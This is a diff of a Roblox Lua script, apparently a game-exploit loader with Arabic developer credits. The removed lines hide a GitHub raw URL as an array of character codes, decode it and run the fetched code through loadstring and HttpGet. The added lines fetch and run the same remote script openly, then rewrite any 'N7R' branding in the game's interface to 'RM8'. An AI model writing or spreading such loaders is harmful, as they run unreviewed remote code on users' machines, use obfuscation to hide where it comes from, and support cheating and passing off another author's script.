@@ -2,26 +2,38 @@ print("--------------------------------------------------")
 print("المطور القثردي🇸🇦 /المبرمج ابو حديده🗞")
 print("--------------------------------------------------")
 
-local _0xRM8Data = {
-    104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 
-    117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 
-    109, 47, 107, 107, 109, 109, 97, 105, 56, 50, 47, 90, 51, 109, 47, 114, 101, 
-    102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 83, 111, 111, 110
-}
-
-local function _0xExecuteSecure()
-    local _0xPayload = ""
-    for _0xKey = 1, #_0xRM8Data do
-        _0xPayload = _0xPayload .. string.char(_0xRM8Data[_0xKey])
-    end
-    
-    local _0xStatus, _0xOutput = pcall(function()
-        return loadstring(game:HttpGet(_0xPayload))()
-    end)
-    
-    if not _0xStatus then
-        warn("[RM8 Core Error]: Secure connection disrupted.")
+local function CleanAndRename()
+    for _, obj in pairs(game:GetService("CoreGui"):GetDescendants()) do
+        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
+            if obj.Text:find("N7R") or obj.Text:find("n7r") then
+                obj.Text = obj.Text:gsub("N7R", "RM8")
+                obj.Text = obj.Text:gsub("n7r", "RM8")
+            end
+        end
     end
 end
 
-_0xExecuteSecure()
+game:GetService("CoreGui").DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+        task.wait(0.1)
+        if descendant.Text:find("N7R") or descendant.Text:find("n7r") then
+            descendant.Text = descendant.Text:gsub("N7R", "RM8")
+            descendant.Text = descendant.Text:gsub("n7r", "RM8")
+        end
+    end
+end)
+
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/kkmmai82/Z3m/refs/heads/main/Soon"))()
+end)
+
+if success then
+    task.spawn(function()
+        for i = 1, 10 do
+            CleanAndRename()
+            task.wait(0.5)
+        end
+    end)
+else
+    warn("[RM8 Core Error]: " .. tostring(err))
+end
